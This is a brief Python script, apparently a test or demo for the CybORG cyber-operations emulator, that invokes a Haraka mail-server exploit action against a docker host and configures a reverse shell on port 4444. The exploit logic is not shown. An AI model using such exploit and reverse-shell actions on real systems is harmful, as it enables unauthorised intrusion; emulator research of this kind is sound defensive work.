# import json

from CybORG.Emulator.Actions.Velociraptor.HarakaExploitAction import HarakaExploitAction

credentials_file = "prog_client3.yaml"

haraka_exploit_action = HarakaExploitAction(
    credentials_file=credentials_file,
    hostname="TESTDOCKER1",
    mail_server_hostname="172.17.0.4",
    ssh_port=5000,
    reverse_shell_server_port=4444
)

haraka_exploit_observation = haraka_exploit_action.execute(None)

print(f"connection key: \"{haraka_exploit_observation.connection_key}\", ssh port: \"{haraka_exploit_observation.ssh_port}\"")
